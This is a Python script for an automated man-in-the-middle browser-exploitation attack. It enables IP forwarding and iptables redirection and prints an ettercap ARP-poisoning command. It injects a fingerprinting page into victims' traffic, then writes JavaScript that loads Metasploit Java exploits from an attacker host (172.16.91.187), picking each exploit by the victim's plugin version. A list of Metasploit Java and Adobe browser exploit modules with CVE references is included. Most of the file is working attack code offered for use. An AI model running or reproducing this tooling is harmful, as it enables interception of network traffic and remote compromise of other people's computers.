from threading import Thread
from SocketServer import ThreadingMixIn
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import string,cgi,time,urlparse,commands,os,subprocess
from os import curdir, sep
import sys

javaSelfsigned=True
msfPath="/pentest/metasploit-framework"
'''
use exploit/multi/browser/java_atomicreferencearray
use exploit/multi/browser/java_calendar_deserialize
use exploit/multi/browser/java_getsoundbank_bof
use exploit/multi/browser/java_jre17_driver_manager
use exploit/multi/browser/java_jre17_exec
use exploit/multi/browser/java_jre17_glassfish_averagerangestatisticimpl
use exploit/multi/browser/java_jre17_jaxws
use exploit/multi/browser/java_jre17_jmxbean
use exploit/multi/browser/java_jre17_jmxbean_2
#http://cvedetails.com/cve/2013-0431/
use exploit/multi/browser/java_jre17_method_handle
#http://cvedetails.com/cve/2012-5088/
use exploit/multi/browser/java_jre17_provider_skeleton
#http://cvedetails.com/cve/2013-2460/
use exploit/multi/browser/java_jre17_reflection_types
#http://cvedetails.com/cve/2013-2423/
use exploit/multi/browser/java_rhino
#http://cvedetails.com/cve/2011-3544/
use exploit/multi/browser/java_rmi_connection_impl
#http://cvedetails.com/cve/2010-0094/
use exploit/multi/browser/java_setdifficm_bof
#http://cvedetails.com/cve/2009-3869/
use exploit/multi/browser/java_signed_applet
use exploit/multi/browser/java_storeimagearray
#http://cvedetails.com/cve/2013-2465/
use exploit/multi/browser/java_trusted_chain
#http://cvedetails.com/cve/2010-0840/
use exploit/multi/browser/java_verifier_field_access
#http://cvedetails.com/cve/2012-1723/

use exploit/windows/browser/adobe_cooltype_sing
use exploit/windows/browser/adobe_flash_avm2
use exploit/windows/browser/adobe_flash_filters_type_confusion
use exploit/windows/browser/adobe_flash_mp4_cprt
use exploit/windows/browser/adobe_flash_otf_font
use exploit/windows/browser/adobe_flash_pixel_bender_bof
use exploit/windows/browser/adobe_flash_regex_value
use exploit/windows/browser/adobe_flash_rtmp
use exploit/windows/browser/adobe_flash_sps
use exploit/windows/browser/adobe_flashplayer_arrayindexing
use exploit/windows/browser/adobe_flashplayer_avm
use exploit/windows/browser/adobe_flashplayer_flash10o
use exploit/windows/browser/adobe_flashplayer_newfunction
use exploit/windows/browser/adobe_flatedecode_predictor02
use exploit/windows/browser/adobe_geticon
#Affected versions include < 7.1.1, < 8.1.3, and < 9.1.
use exploit/windows/browser/adobe_jbig2decode
#Adobe Reader v8.1.2 and v9.0.0
use exploit/windows/browser/adobe_media_newplayer
#Adobe Reader and Adobe Acrobat Professional versions up to and including 9.2.
use exploit/windows/browser/adobe_shockwave_rcsl_corruption
#Weakness in the Adobe Shockwave player's handling of Director movies (.DIR).
use exploit/windows/browser/adobe_toolbutton
#Adobe Reader versions 11.0.2, 10.1.6 and 9.5.4 and prior
use exploit/windows/browser/adobe_utilprintf
#Adobe Reader and Adobe Acrobat Professional < 8.1.3.
'''

def findVuln(pdtName,pdtVer):
	result = ''
	if pdtName=='flash':
		if pdtVer=='11.9.900.152':
			result='CVE-2013-5331:\n'+'http://www.rapid7.com/db/modules/exploit/windows/browser/adobe_flash_filters_type_confusion'
	return result

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if 'fingerprint.html' in self.path:
                f = open(curdir + sep + self.path, 'rb')
		self.send_response(200)
                self.send_header('Content-type',    'text/html')
                self.end_headers()
                self.wfile.write(f.read())
                f.close()
                return		
        else:
            parsed_path = urlparse.urlparse(self.path)
            message_parts = [
                    'client_address=%s (%s)' % (self.client_address,
                                                self.address_string()),
                    'query=%s' % parsed_path.query,
                    ]
            for name, value in sorted(self.headers.items()):
                message_parts.append('%s=%s' % (name, value.rstrip()))
            message_parts.append('')
            message = '\r\n'.join(message_parts)
            self.send_response(200)
            self.end_headers()
            for msg in message_parts:
                if 'client_address' in msg:
                    print "Target: "+msg.split(") (")[1].strip(")")
                if 'query' in msg:
                    pluginVer = msg.replace("query=","").split('&')
		    for i in pluginVer:
			if i:
				pdtName,pdtVer = i.split("=")
				pdtVer = pdtVer.replace(",",".")
				print pdtName+'\t'+pdtVer
            return

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""     

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

def getIP(iface):
    cmd = "ifconfig "+iface+" | grep 'inet ' | awk '{print $2}' | cut -d':' -f 2"
    ipAddr = commands.getstatusoutput(cmd)[1]
    return ipAddr

def modifyHTML(filename):
    content = []
    
    ipAddr = getIP('eth0')
    with open(filename) as f:
    	for line in f:
		if '$.get(' in line:
			replaceLine = "		$.get('http://"+ipAddr+":9090/scan?'+ params, function(data) {"
			content.append(replaceLine)
		elif line.strip()=="//plugins":
			content.append(line)
			content.append("var iframe = document.getElementById('exploit');\n")
			content.append("if(plugins[ao[i]]=='java'){\n")
			content.append("if(BrowserScanHostDetails[ao[i]]=='1,7,0,0'){\n")
			content.append("url = 'http://172.16.91.187:8081/exploit';\n")
			content.append("iframe.setAttribute('src',url);\n")
			content.append("iframe.contentDocument.location.reload(true);\n")
			content.append("}\n")
			content.append("}\n")
			content.append("verSplit=BrowserScanHostDetails[ao[i]].split(',');\n")
			content.append("verMaj = verSplit[0]+','+verSplit[1]+','+verSplit[2];\n")
			content.append("verMin = verSplit[3];\n")
			#content.append("alert(verMaj);\n")
			#content.append("alert(verMin);\n")
			content.append("if(verMaj=='1,7,0'){if(verMin<18){iframe.setAttribute('src','http://172.16.91.187:8085/java_jre17_reflection_types');iframe.contentDocument.location.reload(true);}};")
			content.append("if(verMaj=='1,7,0'){if(verMin>0 && verMin<12){iframe.setAttribute('src','http://172.16.91.187:8081/java_jre17_jmxbean_2');iframe.contentDocument.location.reload(true);}};")

			content.append("if(verMaj=='1,7,0'){if(verMin>0 && verMin<8){iframe.setAttribute('src','http://172.16.91.187:8081/java_jre17_method_handle');iframe.contentDocument.location.reload(true);}};")
			content.append("if(verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src','http://172.16.91.187:8081/java_jre17_provider_skeleton');iframe.contentDocument.location.reload(true);}};")
			content.append("if(verMaj=='1,6,0'){if(verMin>3 && verMin<28){url = 'http://172.16.91.187:8081/java_rhino';iframe.setAttribute('src',url);alert(iframe.src);iframe.contentDocument.location.reload(true);}};")

			content.append("if(verMaj=='1,6,0'){if(verMin==32){url = 'http://172.16.91.187:8081/java_verifier_field_access';iframe.setAttribute('src',url);alert(iframe.src);iframe.contentDocument.location.reload(true);}};")
			content.append("if(verMaj=='1,7,0'){if(verMin==4){url = 'http://172.16.91.187:8081/java_verifier_field_access';iframe.setAttribute('src',url);alert(iframe.src);iframe.contentDocument.location.reload(true);}};")
			content.append("if(verMaj=='1,5,0'){if(verMin==35){url = 'http://172.16.91.187:8081/java_verifier_field_access';iframe.setAttribute('src',url);alert(iframe.src);iframe.contentDocument.location.reload(true);}};")

			content.append("if(verMaj=='1,6,0'){if(verMin>0 && verMin<19){url = 'http://172.16.91.187:8091/java_trusted_chain';iframe.setAttribute('src',url);alert(iframe.src);iframe.contentDocument.location.reload(true);}};")
			content.append("if(verMaj=='1,5,0'){if(verMin>0 && verMin<24){url = 'http://172.16.91.187:8091/java_trusted_chain';iframe.setAttribute('src',url);alert(iframe.src);iframe.contentDocument.location.reload(true);}};")
			content.append("if(verMaj=='1,4,2'){if(verMin>0 && verMin<10){url = 'http://172.16.91.187:8091/java_trusted_chain';iframe.setAttribute('src',url);alert(iframe.src);iframe.contentDocument.location.reload(true);}};")
			
			content.append("if(verMaj=='1,5,0'){if(verMin>35 && verMin<46){url = 'http://172.16.91.187:8090/java_storeimagearray';iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};")
			content.append("if(verMaj=='1,6,0'){if(verMin>21 && verMin<46){url = 'http://172.16.91.187:8090/java_storeimagearray';iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};")
			content.append("if(verMaj=='1,7,0'){if(verMin>-1 && verMin<22){url = 'http://172.16.91.187:8090/java_storeimagearray';iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};")

			content.append("if(verMaj=='1,6,0'){if(verMin>0 && verMin<17){url = 'http://172.16.91.187:8081/java_setdifficm_bof';iframe.setAttribute('src',url);alert(iframe.src);iframe.contentDocument.location.reload(true);}};")
			content.append("if(verMaj=='1,5,0'){if(verMin>0 && verMin<22){url = 'http://172.16.91.187:8081/java_setdifficm_bof';iframe.setAttribute('src',url);alert(iframe.src);iframe.contentDocument.location.reload(true);}};")
			content.append("if(verMaj=='1,4,0'){if(verMin>0 && verMin<25){url = 'http://172.16.91.187:8081/java_setdifficm_bof';iframe.setAttribute('src',url);alert(iframe.src);iframe.contentDocument.location.reload(true);}};")

			content.append("if(verMaj=='1,6,0'){if(verMin>-1 && verMin<19){url = 'http://172.16.91.187:8081/java_rmi_connection_impl';iframe.setAttribute('src',url);alert(iframe.src);iframe.contentDocument.location.reload(true);}};")
			'''
		#elif '<body>' in line:
		#	content.append(line)
		#	if javaSelfsigned==True:
		#		content.append('<applet archive="http://'+ipAddr+':8081/java/Microsoft.jar" code="Microsoft" width="1" height="1"></applet>')
		else:
			content.append(line)
    fo = open("fingerprint.html", "w+") 
    fo.writelines(content)
    fo.close()
def setupForwarding():
	print "[*] Setup forwarding"
	cmd = "sysctl -w net.ipv4.ip_forward=1"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "echo '1' > /proc/sys/net/ipv4/ip_forward"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080"
	subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
	cmd = "iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080"

def startMITMproxy():
	setupForwarding()
	#cmd = 'screen -list | grep msfconsole'
	#result = commands.getstatusoutput(cmd)[1]
	#if 'msfconsole' not in result:
	#	cmd = 'screen -dmS msfconsole'
	#	subprocess.Popen(cmd, shell=True)
	#time.sleep(2)
	#cmdStr = '/bin/bash --login'
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)
	
	#time.sleep(2)
	#cmdStr = 'rvm use 1.9.3-p484'
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)

	cmdStr = 'cd '+msfPath
	print cmdStr
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)

	cmdStr = './msfconsole -r '+os.getcwd()+'/msfrun.rc'
	print cmdStr
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)

	#time.sleep(5)
	#cmdStr = 'resource '+os.getcwd()+'/msfrun.rc'
	#print cmdStr
	#cmd = 'screen -S msfconsole -X stuff "'+cmdStr+'^m"'
	#subprocess.Popen(cmd, shell=True)
	
	cmd = 'screen -list | grep mitm'
	result = commands.getstatusoutput(cmd)[1]
	if 'mitm' not in result:
		cmd = 'screen -dmS mitm'
		subprocess.Popen(cmd, shell=True)
	cmdStr = 'cd '+os.getcwd()
	#print cmdStr
	cmd = 'screen -S mitm -X stuff "'+cmdStr+'^m"'
	subprocess.Popen(cmd, shell=True)
        ipAddr = getIP('eth0')
	cmdStr = 'python iframe_injector http://'+ipAddr+':9090/fingerprint.html'
	cmd = 'screen -S mitm -X stuff "'+cmdStr+'^m"'
	#print cmdStr
	subprocess.Popen(cmd, shell=True)
	print 
	#cmd = 'screen  -S hello  -X stuff "ping 4.2.2.2^m"

def setupMetasploit():
	ipAddr = getIP()
	#"use exploit/multi/browser/java_signed_applet"
	#"set SRVHOST "+ipAddr
	#"set SRVPORT 8081"
	#"set URIPATH /java"

def main():
    try:
	#Get Gateway
	cmd = "route -n | awk '$2 ~/[1-9]+/ {print $2;}'"
	gatewayIPList = commands.getstatusoutput(cmd)[1]
	gatewayIP = gatewayIPList.split("\n")[0]
        server = ThreadedHTTPServer(('', 9090), Handler)
        print 'Started httpserver...'
	startMITMproxy()
	modifyHTML('fingerprint_template.html')
	print "[*] Run the below command in another terminal"
	print bcolors.OKGREEN+"ettercap -T -q -M ARP /targetIP/  /"+gatewayIP+"/"+bcolors.ENDC
        server.serve_forever()
    except KeyboardInterrupt:
        print '^C received, shutting down server'
	cmd = "killall screen"
	#subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE)
        server.socket.close()

if __name__ == '__main__':
    main()
